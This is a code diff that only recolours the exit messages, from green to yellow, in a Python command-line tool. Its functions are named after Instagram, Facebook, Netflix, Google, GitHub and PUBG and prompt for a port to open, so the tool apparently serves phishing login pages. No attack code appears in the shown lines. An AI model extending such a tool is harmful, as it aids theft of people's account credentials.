@@ -129,7 +129,7 @@ def instagram():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
@@ -179,7 +179,7 @@ def instagram():
                     break
 
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
@@ -240,7 +240,7 @@ def facebook():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
@@ -287,7 +287,7 @@ def facebook():
                     break
 
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
@@ -346,7 +346,7 @@ def netflix():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 
@@ -394,7 +394,7 @@ def netflix():
     
                     break
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
@@ -454,7 +454,7 @@ def Google():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"""\n{Fore.GREEN}│
+            exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
@@ -502,7 +502,7 @@ def Google():
                     break
 
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
@@ -560,7 +560,7 @@ def Github():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"""\n{Fore.GREEN}│
+            exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #====================================================================================================
@@ -610,7 +610,7 @@ def Github():
                     break
 
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #write username====================================================================================================
     while True:
@@ -668,7 +668,7 @@ def Pubg():
     try:
         port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
     except KeyboardInterrupt:
-            exit(f"""\n{Fore.GREEN}│
+            exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #====================================================================================================
@@ -719,7 +719,7 @@ def Pubg():
                     break
 
     except KeyboardInterrupt:
-        exit(f"""\n{Fore.GREEN}│
+        exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #write username====================================================================================================
